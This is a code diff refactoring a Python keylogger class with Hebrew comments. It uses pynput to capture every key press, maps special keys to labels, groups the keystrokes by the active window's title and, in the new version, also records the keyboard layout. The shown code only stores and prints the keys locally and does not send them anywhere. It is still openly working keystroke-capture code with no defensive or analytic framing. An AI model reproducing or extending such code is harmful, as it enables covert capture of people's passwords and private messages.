@@ -1,44 +1,53 @@
 from abc import ABC, abstractmethod
 from typing import List
-import keyboard
 import win32gui
 from pynput.keyboard import Listener
+import win32api
+
 
 class IKeyLogger(ABC):
-     @abstractmethod
-     def start_logging(self) -> None:
+    @abstractmethod
+    def start_logging(self) -> None:
         pass
 
-     @abstractmethod
-     def stop_logging(self) -> None:
+    @abstractmethod
+    def stop_logging(self) -> None:
         pass
 
-     @abstractmethod
-     def get_logged_keys(self) -> List[str]:
+    @abstractmethod
+    def get_logged_keys(self) -> List[str]:
         pass
+
 
 class mein_keylogg(IKeyLogger):
 
     def __init__(self):
         self.listener = None
         self.logged_keys = []
-        self.lest_windo_tytel = ""
 
-    def _get_active_window_title(self):
+
+    def _get_active_window_title(self) -> str:
         window = win32gui.GetForegroundWindow()
-        title = win32gui.GetWindowText(window)
-        return title
+        return win32gui.GetWindowText(window)
 
-    def add_key_and_window(self,event):
+    def _add_key_and_window(self, event: str) -> None:
         window_title = self._get_active_window_title()
+        language_id = win32api.GetKeyboardLayoutName() # מקבלים את שם השפה
+
         try:
-            self.logged_keys[-1][window_title] += event
+            # **שינוי חשוב כאן!**  אנחנו שומרים גם את השפה במילון
+            if 'text' in self.logged_keys[-1][window_title]:
+                self.logged_keys[-1][window_title]['text'] += event
+            else:
+                self.logged_keys[-1][window_title]['text'] = event
+                self.logged_keys[-1][window_title]['language'] = language_id # **שומרים את השפה כאן!**
         except:
-            self.logged_keys.append({window_title : event})
+            self.logged_keys.append({window_title: {'text': event, 'language': language_id}}) # **וגם כאן!**
+
         print(type(event))
         print(self.logged_keys)
 
-    def key(self, key):
+    def _on_key_press(self, key) -> None:
         try:
             key = key.char
         except AttributeError:
@@ -106,20 +115,18 @@ class mein_keylogg(IKeyLogger):
             "Key.scroll_lock": "(*scroll_lock*)"
         }
         key = keys_dict.get(key, key)
-        self.add_key_and_window(key)
+        self._add_key_and_window(key)
 
+    def start_logging(self) -> None:
+        self.listener = Listener(on_press=self._on_key_press)
+        self.listener.start()
 
-    def stop_logging(self):
-        # keyboard.unhook(self.listener)
-        pass
+    def stop_logging(self) -> None:
+        if self.listener:
+            self.listener.stop()
 
     def get_logged_keys(self) -> List[str]:
         return self.logged_keys
 
-    def start_logging(self):
-        self.listener = Listener(on_press=self.key)  # הקשה כשמזהה  לפונקציה  קריאה
-        self.listener.start()
-        self.listener.join()
 
-a = mein_keylogg()
-a.start_logging()
+
